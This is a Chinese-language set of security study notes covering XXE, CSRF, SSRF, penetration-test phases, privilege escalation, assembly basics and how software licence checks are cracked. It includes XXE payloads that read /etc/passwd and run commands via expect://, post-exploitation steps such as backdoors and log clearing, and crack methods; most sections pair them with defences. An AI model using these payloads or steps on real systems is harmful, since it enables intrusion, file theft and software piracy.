<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">&gt;</span></span>&amp;content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<ul>
<li>外部实体</li>
</ul>
<p>XML声明+DTD文档+文档元素</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- XML声明 --&gt;</span>
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>

<span class="token comment">&lt;!-- DTD 文档类型说明 --&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">PAYLOAD</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token comment">&lt;!--这里声明了变量，类型是什么--&gt;</span>
	<span class="token comment">&lt;!-- 内部 --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">name</span> <span class="token attr-name">"name"</span><span class="token punctuation">&gt;</span></span>
	<span class="token comment">&lt;!-- 外部 --&gt;</span>
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- 文档元素--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;name;">&amp;name;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>payload</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>payload</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="攻击代码-1"><a href="#攻击代码-1" class="headerlink" title="攻击代码"></a>攻击代码</h4><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE ANY [
读取任意文件
&lt;!ENTITY xxe SYSTEM "file:///C:/windows/system.ini"&gt;
执行系统命令
&lt;!ENTITY xxe SYSTEM "expect://whoami"&gt;
探测内网端口
&lt;!ENTITY xxe SYSTEM "http://192.x.x.x:81/xx"&gt;
攻击内网网站
当跳板类似1和3.
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="防御-14"><a href="#防御-14" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防止XXE攻击：</strong></p>
<ul>
<li>尽可能使用简单的数据格式，并面对敏感数据进行序列化</li>
<li>及时修护更新使用的XML处理器和库</li>
<li>在XML解析器中禁用XML外部实体和DTD进程</li>
<li>在服务器实施白名单过滤</li>
<li>使用SAST工具进行检测，使用API安全网关，WAF检测等预防XXE攻击</li>
<li><code>libxml_disable_entity_loader(true);</code></li>
</ul>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">libxml_disable_entity_loader(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>libxml_disable_entity_loader()</code>作用是设置是否禁止从外部加载XML实体，设为true就是禁止，目的是防止XML注入攻击</p>
</blockquote>
<h3 id="跨站请求伪造-CSRF"><a href="#跨站请求伪造-CSRF" class="headerlink" title="跨站请求伪造(CSRF)"></a>跨站请求伪造(CSRF)</h3><h4 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h4><p><strong>CSRF是什么</strong></p>
<p>csrf 是一个可以发送http请求的脚本。可以伪装受害者向网站发送请求,达到修改网站数据的目的。</p>
<p>在受害者不知情的情况下，伪造受害者发出请求，实现在未授权的情况下执行操作。例如获取敏感信息等。</p>
<p><strong>流程：</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252127624.png" alt="image-20220525212703412"></p>
<h4 id="防御-15"><a href="#防御-15" class="headerlink" title="防御"></a>防御</h4><ol>
<li>禁止第三方网站使用本站Cookie。</li>
<li>最普遍的一种防御方法，后端生成一个token放在session中并发给前端，前端发送请求时携带这个token，后端通过校验这个token和session中的token是否一致判断是否是本网站的请求。</li>
<li><code>referer</code>代表着请求的来源，不可以伪造。后端写个过滤器检查请求的headers中的<code>referer</code>，检验是不是本网站的请求。</li>
</ol>
<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><h4 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是SSRF漏洞：</strong>SSRF是一种由攻击者伪造服务端发起请求的一个安全漏洞，用于攻击目标网站的内部系统。</p>
<p><strong>SSRF攻击的原理：</strong>服务端提供从其他内部服务器应用获取数据的功能，且没有对目标地址做过滤与限制。</p>
<p><strong>SSRF用途：</strong></p>
<ul>
<li><p>内外网的端口和服务扫描</p>
</li>
<li><p>主机本地敏感数据的读取</p>
</li>
<li><p>内外网主机应用程序漏洞的利用</p>
</li>
<li><p>内外网Web站点漏洞的利用</p>
</li>
</ul>
<p><strong>容易造成SSRF的函数</strong></p>
<ul>
<li><code>file_get_contents():</code>将整个文件读入一个字符串</li>
<li><code>fsockopen():</code>打开一个网络连接或者一个unix套接字连接</li>
<li><code>curl_exec():</code>执行一个curl会话</li>
</ul>
<h4 id="防御-16"><a href="#防御-16" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防御：</strong></p>
<ol>
<li>过滤返回的信息</li>
<li>统一错误信息</li>
<li>限制请求的端口为HTTP常见的端口</li>
<li>黑名单内网IP</li>
<li>禁用不需要的协议</li>
</ol>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><strong>渗透测试过程的七个阶段：</strong></p>
<ol>
<li><p>前期交互阶段： 确定测试范围及限制条件以及目的效果等（黑盒白盒）</p>
</li>
<li><p>情报收集阶段（时间最长，最为重要）： 获取网络配置及系统信息，nmap，端口等扫描</p>
<blockquote>
<ul>
<li>目标选择：选择攻击目标，确定攻击达到的效果</li>
<li>隐私收集：现场信息收集甚至从丢弃的废品中收集信息；目标单位外部的信息收集</li>
<li>踩点工作：主动和被动扫描技术</li>
<li>验证目标的安全机制：防火墙、网络流量过滤系统、网络和主机的保护措施的确认工作</li>
</ul>
</blockquote>
</li>
<li><p>威胁建模阶段： 利用得到的信息规划攻击方式，漏洞扫描工具</p>
</li>
<li><p>漏洞分析阶段： 综合情报信息找出可攻击的点，测试验证研究漏洞</p>
</li>
<li><p>渗透攻击阶段： 实施攻击获得系统的访问控制权</p>
</li>
<li><p>后渗透攻击阶段： 对目标组织的具体业务进行攻击，包括成功渗透攻击到对方计算机以后的很多任务，比如提权、上传和下载文件、跳板攻击等</p>
</li>
<li><p>报告阶段： 汇总渗透过程并给出防御办法</p>
<blockquote>
<ul>
<li>确定目标最为重要的威胁</li>
<li>将渗透测试得到的数据生成表格和图表</li>
<li>对目标系统的改进建议</li>
<li>对问题的修复方案</li>
</ul>
</blockquote>
<p><strong>完整的渗透测试流程</strong></p>
<p><strong><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205222258122.png" alt="image-20220522225754792"></strong></p>
<p><strong>后渗透模块：</strong></p>
<ol>
<li><p>扫描内网主机，发现是否存在其他内网主机并尝试渗透</p>
</li>
<li><p>提权</p>
</li>
<li><p>渗透访问控制的持久化</p>
<ul>
<li>添加一个新用户</li>
<li>Dump密码等</li>
<li>使用MSF的persistence、metsvc(Nindows)等模块安装永久性后门</li>
</ul>
</li>
<li><p>清除痕迹</p>
<p>清理日志(run event_manager,clearev(清除Nindows.系统下的应用、系<br>统和安全日志)</p>
</li>
</ol>
<p>其他网安的东西：</p>
</li>
</ol>
<blockquote>
<p>1.简叙黑客攻击的基本流程，并说明每一步的主要任务</p>
<blockquote>
<ul>
<li>踩点： 收集信息</li>
<li>扫描： 评估系统，寻找可攻击范围</li>
<li>查点： 寻找系统中的用户信息以及可获得的共享资源以及可以利用的漏洞</li>
<li>访问： 利用收集的信息尝试访问和攻击</li>
<li>提权： 获取系统的完全控制权限</li>
<li>窃取信息： 获取机密信息</li>
<li>掩踪灭迹： 删除日志</li>
<li>创建后门： 创建后门方便下次访问</li>
<li>拒绝服务： dos攻击使系统瘫痪</li>
</ul>
</blockquote>
<p>2.什么是渗透测试？可以分为哪几种类型？</p>
<blockquote>
<p>渗透测试（penetration test）是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。</p>
<p>类型：</p>
<p>白盒测试</p>
<p>渗透人员拥有客户所有知识情况下的渗透测试</p>
<p>黑盒测试</p>
<p>渗透人员不了解大部分知识情况下的渗透测试</p>
<p>灰盒测试</p>
<p>介于白盒和黑盒之间，渗透人员了解部分知识情况下的渗透测试</p>
</blockquote>
<p>3.渗透测试分为那七个阶段，每个阶段的主要内容</p>
<blockquote>
<p>1.前期交互：确定测试范围及限制条件</p>
<p>2.情报搜集：获取网络配置及系统信息</p>
<p>3.威胁建模：利用得到的信息规划攻击</p>
<p>4.漏洞分析：综合情报信息找出可攻击的点</p>
<p>5.渗透攻击：实施攻击获得系统的访问控制权</p>
<p>6.后渗透攻击：对目标组织的具体业务进行攻击</p>
<p>7.报告：汇总渗透过程并给出防御办法</p>
</blockquote>
<p>4.黑客攻击和渗透测试的异同点？</p>
<blockquote>
<p>相同</p>
<p>入侵和渗透在操作流程相似</p>
<p>都是为了获取系统权限进行攻击</p>
<p>都是利用漏洞进行攻击和突破</p>
<p>不同</p>
<p>入侵和渗透在操作上类似，但是本质确不同。</p>
<p>入侵是以破坏或者盗取信息为目的，渗透是为了发现漏洞修复为目的；</p>
<p>入侵会造成损失，渗透是为了避免损失；</p>
<p>入侵的是黑帽子黑客，渗透的是白帽子黑客；</p>
<p>入侵是非法的，渗透是合法的；</p>
<p>入侵是攻击，渗透是防御。</p>
<p>主要是在于1：是否有授权 2：挖到漏洞了以后是否对漏洞进行了利用</p>
</blockquote>
</blockquote>
<p><strong>针对渗透攻击的防护：</strong></p>
<ol>
<li><p>确保在组织中的任何位置都使用强凭据</p>
</li>
<li><p>建立信任边界</p>
</li>
<li>跨所有系统实施和执行变更控制</li>
<li>执行补丁管理程序</li>
<li>定期进行漏洞评估</li>
</ol>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>什么是提权：</strong>利用操作系统或应用软件中的程序错误、设计缺陷或配置不当来获取受保护资源的高级访问权限。</p>
<p><strong>提权的目的：</strong>拿到shell后对目标的某些访问依旧受限，获取目标系统的最高权限</p>
<h3 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h3><p><strong>windows提权的俩种方式：</strong>获取system权限（最佳）、获取Administrator权限</p>
<p><strong>windows提权的一般步骤：</strong></p>
<ol>
<li>获取低权限shell</li>
<li>利用MSF meterpreter getsystem提权</li>
<li>查看windows版本提权漏洞</li>
<li>systeminfo查看安装补丁</li>
<li>查找相关提权EXP</li>
<li>应用程序提权</li>
</ol>
<p><strong>windows下利用操作系统利用提权：</strong></p>
<ul>
<li><p>DDL注入（通过劫持某些以高权限启动的程序中导入的DL,达到以高<br>权限执行恶意操作的目的）</p>
</li>
<li><p>窃取Token</p>
<blockquote>
<p>access token(访问令牌)是Vindows安全的一个概念，包含此登录会话的安<br>全信息。用户登录时，系统创建一个访问令牌，然后以该用户身份运行的所有进<br>程都拥有该令牌的一个拷贝。该令牌唯一表示该用户、用户组和用户特权（类似<br>于Cookie)<br>通过窃取高权限用户的Token,可以获得高权限</p>
</blockquote>
</li>
<li><p>窃取管理员账户密码</p>
</li>
<li><p>可执行文件路径未被引号包裹</p>
<blockquote>
<p>假如把恶意XE放在这些路径下，那么当系统级服务重启时，便会以<br>高权限执行恶意文件</p>
</blockquote>
</li>
<li><p>允许非特权用户使用system权限执行MSI文件（组策略配置错误）</p>
</li>
</ul>
<p><strong>防御</strong></p>
<ul>
<li>不在将密码保存在组策略首选项中</li>
<li>合理配置设置，拒绝不合理操作</li>
<li>及时打补丁和更新系统版本</li>
<li>对用户权限进行限制</li>
<li>合理检测系统软件，安装防火墙等安全软件</li>
</ul>
<h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><p><strong>Linux系统提权的一般步骤：</strong></p>
<p>（1）查看内核版本</p>
<p>（2）查看系统是否存在配置不当</p>
<p>（3）应用程序提权</p>
<p><strong>示例</strong></p>
<ul>
<li>脏牛漏洞(CVE-2016-5195):Linux内核的内存子系统在处理写时复制(copy-on-write,COW)时产生了竞争条件。恶意用户可利用此漏洞，对只读内存映射进行写访问来获取高权限</li>
<li>Linux内核提权漏洞(cVE-2017-6074)</li>
<li>Linux sudo提权(CVE-2021-3156)</li>
</ul>
<p><strong>linux系统提权的操作：</strong></p>
<ul>
<li>SUID程序提权</li>
<li>修改用户属组</li>
<li>修改/etc/passwd</li>
<li>修改root用户ssh密钥</li>
<li>通配符提权</li>
<li>应用程序提权</li>
</ul>
<p><strong>如何防止提权：</strong></p>
<ul>
<li>系统管理员要安全，准确的配置SUID执行文件。</li>
<li>一些没必要以高权限用户执行的文件，应该取消权限。</li>
<li>规避使用无密码root 执行命令，脚本等。</li>
<li>修复/升级存在已知漏洞的组件，升级操作系统版本最新版。</li>
<li>Linux 2.2 之后可以为命令增加 capabilities, 以p 师傅博客里的给nmap增加该属性为例。</li>
<li>升级第三方服务，修复已知漏洞</li>
</ul>
<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="数据库UDP提权"><a href="#数据库UDP提权" class="headerlink" title="数据库UDP提权"></a>数据库UDP提权</h4><p>UDF:User Defined Function</p>
<p><strong>前提条件</strong>：</p>
<ol>
<li>获得root账户密码</li>
<li>数据库开启plugin</li>
<li>数据库监听公网</li>
</ol>
<p><strong>UDF提权步骤</strong></p>
<ol>
<li>查看  secure_file_priv  的值</li>
<li>查看plugin的值</li>
<li>查看系统架构以及plugin目录</li>
<li>将dll文件写入plugin目录,并且创建函数</li>
<li>使用系统命令（在将 udf.dll 文件写入plugin目录后，我们就可以使用 sys_eval 函数了。）</li>
<li>或者使用MSF进行UDF提权</li>
</ol>
<h4 id="Redis提权"><a href="#Redis提权" class="headerlink" title="Redis提权"></a>Redis提权</h4><p>Redis数据库以root权限启动，配合未授权访问漏洞，攻击者可以连接数据库并写入ssh密钥，接着就可以以root用户身份登录服务器</p>
<h4 id="如何防止提权："><a href="#如何防止提权：" class="headerlink" title="如何防止提权："></a>如何防止提权：</h4><ol>
<li><p>及时打补丁</p>
</li>
<li><p>启动Web、DB服务时以低权限启动</p>
</li>
<li><p>服务器只监听127.0.0.1</p>
</li>
</ol>
<h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><h3 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h3><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><ul>
<li>小端序(Littie endian):低地址存放低字节，高地址存放高字节，符合人类<br>思维</li>
<li>大端序(Big endian)：低地址存放高字节，高地址存放低字节</li>
<li>对于char字符数组，在内存中连续不管大端序还是小端序，存储顺序都是一样的，按大端</li>
</ul>
<blockquote>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">'windows.h'</span></span>
BYTE b<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
WORD w<span class="token operator">=</span><span class="token number">0x5678</span><span class="token punctuation">;</span>
DWORD dw<span class="token operator">=</span><span class="token number">0x12345678</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> 'ABCD"<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	byte lb<span class="token operator">=</span>b<span class="token punctuation">;</span>
	WORD Iw<span class="token operator">=</span>w<span class="token punctuation">;</span>
	DWORD Idw<span class="token operator">=</span>dw<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>Istr<span class="token operator">=</span>str<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>低<br>| 大端 | 小端 |<br>| :—: | :—: |<br>| A    | A    |<br>| B    | B    |<br>| C    | C    |<br>| D    | D    |<br>| 00    | 00    |<br>| 12 | 78   |<br>| 34 | 56   |<br>| 56 | 34   |<br>| 78 | 12   |<br>| 56 | 78   |<br>| 78 | 56   |<br>| 12   | 12   |</p>
<p>高</p>
<h4 id="汇编结构"><a href="#汇编结构" class="headerlink" title="汇编结构"></a>汇编结构</h4><p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205241414646.png" alt="img"></p>
<p><strong>AT&amp;T语法和intel语法</strong>：AT&amp;T汇编语法被Linux和GCC广泛支持，而INTEL则由Windows支持。</p>
<ul>
<li>赋值方向不同（源和目的操作数的顺序相反）<ul>
<li>INTEL汇编语法第一个操作数表示目的操作数，第二个才是源操作数，赋值方向为从右向左；</li>
<li>AT&amp;T汇编语法则反过来，第一个为源操作数，第二个为目的操作数，故而看着更舒服。</li>
</ul>
</li>
<li>前缀修饰符不同, INTEL的寄存器似乎是直接存取的，而AT&amp;T则需要加上“%”前缀。</li>
<li>后缀修饰符位置不同</li>
</ul>
<p><strong>X86（64）架构：</strong></p>
<p>32位栈与64位栈的区别：</p>
<ul>
<li><p>X64多了8个通用寄存器</p>
</li>
<li><p>X32中原有的寄存器在X64中均为拓展为64位</p>
</li>
</ul>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p><strong>静态分析技术：</strong>根据反汇编得到的程序清单进行分析（不执行代码文件），最常用的方法是从提示信息进行分析</p>
<p><strong>动态分析技术：</strong>动态跟踪是指利用OllyDbg或WinDbg等调试工具，一步一步跟踪分析的过程</p>
<h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><h4 id="栈帧-1"><a href="#栈帧-1" class="headerlink" title="栈帧"></a>栈帧</h4><p><strong>什么是栈帧：</strong>程序运行时栈中分配的内存块，专门用于特定的函数调用</p>
<p><strong>栈帧的大致结构：</strong>函数序言、函数尾声</p>
<pre class="line-numbers language-none"><code class="language-none">PUSH EBP				;函数开始（使用EBP前先把已有值保存到栈中)
MOV EBP,ESP				;保存当前ESP到EBP中
SUB ESP,50				;抬高栈顶
PUSH EBX				;保存环境变量
PUSH ESI				;保存环境变量
PUSH EDI				;保存环境变量
lea edi,dword ptr ss:[ebp-50]      ;EDl存入循环操作的起始地址
MOV ECX,14				;ECX存入的是循环次数
mov eax.CCCCCCCC		;EAX是循环填入的值
rep stosd				;循环填充栈CC
						；函数体
						；无论ESP值如何变化，EBP都保持不变，可以安全访问函数的局部变量、参数
MOV ESP,EBP				；将函数的起始地址返回到ESP中
POP EBP					；函数返回前弹出保存在栈中的EBP值
RET						；函数终止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的<strong>栈顶</strong>。</p>
</li>
<li><p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的<strong>底部</strong>。</p>
</li>
<li>xor eax,eax  操作是将eax置零。</li>
<li>CC指令：NT3中断的机器码</li>
</ul>
<blockquote>
<p>栈保护者(stack protector)在栈帧中存储一个特殊的金丝雀(cannary)值，是在程序每次运行时随机产生的。在恢复寄存器状态和从函数返回前，程序检查该值是否被改变</p>
<p>GCC:<code>·-fno-stack-protector·</code>选项可关闭该功能</p>
</blockquote>
<p><strong>调用函数的操作步骤：</strong></p>
<p>（1）调用方将被调用函数所需参数放入到函数所采用的调用约定指定位置</p>
<p>（2）调用方将控制权转交给被调用函数（call），然后返回地址被保存到程序站或CPU寄存器中</p>
<p>（3）被调用函数为局部变量分配空间</p>
<p>（4）被调用函数执行操作</p>
<p>（5）被调用函数完成操作，释放局部变量的栈空间</p>
<p>（6）被调用函数将控制权返还给调用方</p>
<h4 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h4><p><strong>什么是调用约定：</strong>指定调用方放置函数所需参数的具体位置</p>
<p><strong>32位</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205241511580.png" alt="image-20220524151127297"></p>
<p><strong>64位</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205241512768.png" alt="image-20220524151221293"></p>
<h5 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h5><p><strong>调用者</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252143880.png" alt="image-20220525214351793"></p>
<p><strong>被调用者</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252144612.png" alt="image-20220525214433517"></p>
<p><strong>栈</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252146253.png" alt="image-20220525214628168"></p>
<h5 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h5><p><strong>调用方</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252147007.png" alt="image-20220525214729924"></p>
<p><strong>被调用方</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252148060.png" alt="image-20220525214847974"></p>
<p><strong>栈</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252149841.png" alt="image-20220525214918746"></p>
<h5 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h5><p><strong>调用方</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252150137.png" alt="image-20220525215012050"></p>
<p><strong>被调用方</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252151180.png" alt="image-20220525215134085"></p>
<p><strong>栈</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252152962.png" alt="image-20220525215203868"></p>
<h5 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h5><p><strong>调用方</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252153546.png" alt="image-20220525215359444"></p>
<p><strong>被调用方</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252156436.png" alt="image-20220525215610345"></p>
<p><strong>栈</strong></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252200004.png" alt="image-20220525220013913"></p>
<blockquote>
<ul>
<li>Microsoft VC++将this传递到ECX寄存器，其他与stdcall相同</li>
<li>GNU g++将this看成第一个隐含参数，将其放置在栈顶，其他与cdecl相同</li>
</ul>
</blockquote>
<h4 id="c-与虚函数"><a href="#c-与虚函数" class="headerlink" title="c++与虚函数"></a>c++与虚函数</h4><ul>
<li>虚函数用于在C++程序中实现多态，其地址不能在编译时确定</li>
<li>虚函数表(Virtual Table,VTBL,虚表)：编译器为每一个包含虚函数的类（或子类）生成一个表，包括指向每一个虚函数的指针</li>
<li>虚函数表指针(Virtual Table Pointer,VPTR,虚表指针)：包含虚函数的类的一个数据成员，用于运行时指向虚表，是类的第一个数据成员</li>
<li><strong>顺序：虚表指针→虚函数表的地址→查询得到函数的地址→调用函数</strong></li>
</ul>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205241524213.png" alt="image-20220524152448949"></p>
<h4 id="栈保护技术"><a href="#栈保护技术" class="headerlink" title="栈保护技术"></a>栈保护技术</h4><ol>
<li><strong>Stack Canary栈保护</strong>：当启用栈保护后，函数开始执行的时候就会向往栈里插入cookie信息，当函数真正返回的时候回验证cookie信息是否合法，若果不合法就会停止程序运行。</li>
<li><strong>缓冲区不可执行NX：</strong>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存表示为不可执行</li>
<li><strong>地址空间布局随机化ASLR：</strong>将程序的内存布局随机化，使得攻击者不能轻易地得到数据区的地址来构造 payload</li>
<li><strong>位置无关可执行文件PIE：</strong>需要配合 ASLR 来使用，以达到可执行文件的加载时地址随机化。简单来说，PIE 是编译时随机化，由编译器完成；ASLR 是加载时随机化，由操作系统完成。</li>
<li><strong>重定位只读RELRO：</strong>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击</li>
<li><strong>FORTIFY技术：</strong> fortify是轻微的检查，用于检查是否存在缓冲区溢出的错误。</li>
</ol>
<h3 id="软件保护技术"><a href="#软件保护技术" class="headerlink" title="软件保护技术"></a>软件保护技术</h3><h4 id="序列号"><a href="#序列号" class="headerlink" title="序列号"></a>序列号</h4><h5 id="序列号-注册码"><a href="#序列号-注册码" class="headerlink" title="序列号/注册码:"></a>序列号/注册码:</h5><ol>
<li>用户将自己的信息（用户名、电子邮件等）告诉软件公司，软件公司根据用户信息，利用预先编写的计算注册码的程序（注册机，KeyGen）计算序列号，并发给用户</li>
<li>用户输入注册信息和序列号。如果正确，则可以正常使用软件，否则限制软件功能、使用时间等</li>
</ol>
<h5 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h5><p><strong>保护机制：</strong></p>
<ol>
<li>将用户名等通过函数F变换后得到注册码，即序列号=F(用户名)</li>
<li>通过注册码验证用户名的正确性，计算方式不变，即序列号=F(用户名)，但验证过程为用户名=$F^{-1}$(序列号)</li>
<li>通过对等函数检测注册码，即$F_2$(序列号)=$F_1$(用户名)</li>
<li>同时将用户名和注册码作为自变量即特定值=F(用户名，序列号)</li>
</ol>
<p><strong>破解方法：</strong></p>
<ul>
<li>序列号以明文的方式出现在内存中，所以很容易找到</li>
<li>生成注册码的过程也包含在软件中，所以容易编写注册码程序</li>
<li><p>修改比较指令绕过注册码检测</p>
</li>
<li><p>F可逆，F-出现在程序中，可以通过其找到逆变换F，得到注册码或者变成注册机</p>
</li>
<li>给定用户名，穷尽序列号，使之满足</li>
</ul>
<blockquote>
<p>即使注册码的算法很复杂，如果可执行程序可以被任意修改，解密者还是可以通过修改比较跳转指令使程序成为注册版，因此还需要配合软件完整性检查等方法</p>
</blockquote>
<p><strong>查找序列号位置：</strong></p>
<ul>
<li>跟踪输入注册码后的判断定位注册码</li>
<li>跟踪程序启动时对注册码的判断过程</li>
<li>数据约束性：正确的序列号会在某时刻出现在内存中，大多数会在一个范围呢，用户输入内存地址$\pm 90$字节的地方</li>
</ul>
<p><strong>序列号比较代码：</strong></p>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">;寄存器比较
mov eax, [xxx]
mov ebx, [xxx]
cmp eax ebx
jz(jnz) xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">;串比较
mov edi, [xxx]
mov esi, [xxx]
rep cmpsd
jz(jnz) xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">;函数比较
mov edi, [xxx]
mov esi, [xxx]
call xxx
test eax eax
jz(jnz) xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">;函数比较
push [xxx]
push [xxx]
call xxx
test eax eax
jz(jnz) xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="加密算法识别"><a href="#加密算法识别" class="headerlink" title="加密算法识别"></a>加密算法识别</h5><p>计算序列号等常使用成熟的加密算法，如MD5、SHA-1等</p>
<p>基于密码算法的特征—MD5，sha256（初始向量号IV），分组密码的S盒，编码特征base64填充，智能化软件识别</p>
<h4 id="警告窗口保护方式"><a href="#警告窗口保护方式" class="headerlink" title="警告窗口保护方式"></a>警告窗口保护方式</h4><p><strong>警告窗口：</strong>用来不时提醒用户购买正版软件的窗口，可以在程序开始，运行中或结束时弹出。</p>
<p><strong>破解方法：</strong></p>
<ul>
<li>用资源修改工具去除警告窗口，可以将窗口改为透明或者不可见</li>
<li>完全去除，找到创建窗口代码(<code>MessageBoxA(W)</code>)跳过</li>
</ul>
